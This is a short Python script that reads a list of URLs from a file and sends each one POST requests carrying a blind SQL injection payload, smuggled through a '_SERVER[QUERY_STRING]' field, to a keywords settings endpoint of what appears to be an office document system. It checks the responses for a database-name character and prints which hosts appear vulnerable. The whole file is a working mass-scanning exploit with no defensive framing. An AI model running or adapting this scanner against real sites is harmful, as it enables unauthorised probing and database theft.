import requests

yes = list()
no = list()




def veri(url):
    data1 = {'_SERVER[QUERY_STRING]': '''kname=1'+and @`'`+or+if(substr(database(),1,1)='t',1,exp(720))#'''}
    data2 = {'_SERVER[QUERY_STRING]': '''kname=1'+and @`'`+or+if(substr(database(),1,1)='d',1,exp(720))#'''}
    data3 = {'_SERVER[QUERY_STRING]': '''kname=1'+and @`'`+or+if(substr(database(),1,1)='o',1,exp(720))#'''}

    r = requests.post(url + '/general/document/index.php/setting/keywords/index', data1)
    if (r.ok):
        r = requests.post(url + '/general/document/index.php/setting/keywords/index', data2)
        if not (r.ok):
            yes.append(url)

    else:
        no.append(url)

def main():
    with open('http.txt','r') as f:
        for url in f:
            veri(url.replace('\n',''))


if __name__ == '__main__':
    main()
    print(yes)
    print('no:')
    print(no)